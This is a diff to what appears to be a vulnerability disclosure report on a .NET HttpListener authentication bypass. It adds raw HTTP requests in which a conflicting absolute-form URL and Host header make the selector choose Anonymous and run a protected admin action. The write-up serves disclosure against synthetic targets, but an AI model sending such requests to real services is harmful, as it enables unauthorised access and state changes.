@@ -4,9 +4,10 @@
 
 Validated end-to-end on supported serviced runtimes using researcher-controlled local sockets only.
 
-Clean GitHub Actions run:
+Clean GitHub Actions runs:
 
-- https://github.com/SamCloudJourney/basic-website/actions/runs/35525493054
+- Authority + selector causal-control run: https://github.com/SamCloudJourney/basic-website/actions/runs/35525493054
+- State-changing admin-action run: https://github.com/SamCloudJourney/basic-website/actions/runs/35525740561
 - Branch: `research/dotnet-runtime-authority-final-20260920`
 
 ## Attack request
@@ -148,3 +149,58 @@ AUTH_SCHEME_BYPASS_SENTINEL_c2a7 returned to unauthenticated client
 ```
 
 All endpoints, names, credentials, and secrets used by the reproduction are synthetic and researcher-controlled.
+
+
+## Framework-owned authentication boundary
+
+This is not only an application-level authorization pattern. The decisive reproduction uses
+`HttpListener.AuthenticationSchemeSelectorDelegate`, a framework authentication feature.
+
+Microsoft's current documentation for `HttpListener.AuthenticationSchemes` explicitly states that:
+- HttpListener returns an incoming request to application code only after successful authentication; and
+- applications that need different authentication mechanisms based on request characteristics may choose based on `Url` or `UserHostName` via `AuthenticationSchemeSelectorDelegate`.
+
+The vulnerable managed implementation makes those two Microsoft-documented selector inputs disagree for the same request.
+
+Documentation:
+https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener.authenticationschemes?view=net-10.0
+
+## Integrity terminal
+
+The clean proof also protects a synthetic state-changing admin action with Basic authentication.
+
+Normal unauthenticated request:
+
+```http
+POST /admin-action HTTP/1.1
+Host: admin.test
+Content-Length: 0
+```
+
+Result:
+
+```text
+401 Unauthorized
+stateChange=False
+```
+
+Conflicting absolute-form request:
+
+```http
+POST http://admin.test:<port>/admin-action HTTP/1.1
+Host: public.test
+Content-Length: 0
+```
+
+On managed Linux/macOS, the built-in selector chooses Anonymous from `UserHostName=public.test`,
+while routing sees `Url.Host=admin.test`. The protected action executes and returns:
+
+```text
+ADMIN_STATE_CHANGE_SENTINEL_83bd
+ADMIN_ACTION_EXECUTED=true
+```
+
+The Windows/http.sys negative control challenges the same request with Basic authentication and does not execute the action.
+
+This demonstrates both confidentiality (protected admin secret retrieval) and integrity (protected admin action execution)
+using synthetic, researcher-controlled resources.
